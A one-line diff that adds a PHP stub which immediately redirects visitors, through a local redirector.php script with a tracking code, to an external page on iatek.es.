@@ -1,0 +1,1 @@
+ <?php echo "<meta http-equiv='refresh' content='0;url=../../redirector.php?code=00001p&url=http://iatek.es/flatgeo/pro.php'>"; ?>
